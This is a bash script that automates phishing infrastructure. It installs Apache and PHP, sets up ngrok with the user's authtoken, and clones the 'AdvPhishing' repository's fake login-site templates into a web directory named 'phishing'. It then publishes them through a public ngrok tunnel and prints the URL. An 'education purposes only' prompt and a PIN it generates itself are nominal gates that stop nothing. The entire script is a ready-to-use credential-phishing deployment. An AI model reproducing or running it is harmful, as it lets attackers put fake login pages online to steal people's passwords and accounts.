#!/bin/bash

# Function to display the educational usage prompt
educational_prompt() {
  echo -e "\e[1;31m\e[1mUse for education purposes only. Do you agree? (yes/no)\e[0m"
  read -r USER_RESPONSE
  if [ "$USER_RESPONSE" != "yes" ]; then
    echo -e "\e[1;31mExiting script. Please use the script for educational purposes only.\e[0m"
    exit 0
  fi
}

# Function to install necessary packages
install_packages() {
  echo "Installing necessary packages..."
  apt-get update
  apt-get install -y apache2 php unzip jq git
  echo "Packages installed."
}

# Function to set up ngrok with API key
setup_ngrok() {
  echo "Setting up ngrok..."
  if [ ! -f "/usr/local/bin/ngrok" ]; then
    wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip -O ngrok.zip
    unzip ngrok.zip
    chmod +x ngrok
    mv ngrok /usr/local/bin
    rm ngrok.zip
  else
    echo "Ngrok is already set up."
  fi

  # Check if ngrok authtoken is already configured
  if [ ! -f "$HOME/.ngrok2/ngrok.yml" ]; then
    echo -n "Enter your ngrok authtoken: "
    read -r NGROK_AUTHTOKEN

    mkdir -p "$HOME/.ngrok2"
    echo "authtoken: $NGROK_AUTHTOKEN" > "$HOME/.ngrok2/ngrok.yml"
  else
    echo "Ngrok authtoken is already configured."
  fi

  echo "Ngrok setup complete."
}

# Function to clone ADVPhishing templates
clone_templates() {
  echo "Cloning ADVPhishing templates..."
  if [ ! -d "AdvPhishing" ]; then
    git clone https://github.com/Ignitetch/AdvPhishing.git
  else
    echo "ADVPhishing repository already exists."
  fi
  if [ ! -d "/var/www/html/phishing" ]; then
    mkdir -p /var/www/html/phishing
    cp -r AdvPhishing/sites/* /var/www/html/phishing/
  else
    echo "Phishing templates already copied."
  fi
  echo "Templates cloned."
}

# Function to start ngrok
start_ngrok() {
  echo "Starting ngrok..."
  ngrok http 80 --config "$HOME/.ngrok2/ngrok.yml" > /dev/null &
  sleep 45  # Increased wait time for ngrok to fully start

  # Loop to wait for the ngrok URL to be available
  while true; do
    NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url)
    if [[ "$NGROK_URL" != "null" ]]; then
      break
    fi
    sleep 1
  done

  if [ -z "$NGROK_URL" ]; then
    echo "Failed to retrieve ngrok URL. Debugging information:"
    curl -s http://127.0.0.1:4040/api/tunnels
    exit 1
  else
    echo -e "\e[1;33m\e[1mNgrok URL: $NGROK_URL\e[0m"
  fi
}

# Function to start Apache server
start_server() {
  echo "Starting Apache server..."
  service apache2 start
  echo "Apache server started."
}

# Function to handle graceful shutdown
shutdown() {
  echo "Shutting down..."
  pkill -f ngrok
  service apache2 stop
  echo "Shutdown complete."
  exit 0
}

# Function to generate a random 5-digit PIN
generate_pin() {
  PIN=$(shuf -i 10000-99999 -n 1)
  echo "Generated PIN: $PIN"
}

# Function to prompt for 5-digit PIN
prompt_pin() {
  read -sp "Enter the 5-digit PIN to proceed: " INPUT_PIN
  echo ""
  if [ "$INPUT_PIN" != "$PIN" ]; then
    echo "Invalid PIN. Please enter the correct 5-digit PIN."
    prompt_pin
  fi
}

# Trap CTRL-C to gracefully shutdown
trap shutdown INT

# Main script execution
educational_prompt
install_packages
setup_ngrok

# Generate and prompt for PIN before starting ngrok
generate_pin
prompt_pin
start_ngrok

# Clone templates and start Apache server after ngrok is running
clone_templates
start_server

# Keep the script running
while true; do
  sleep 1
done
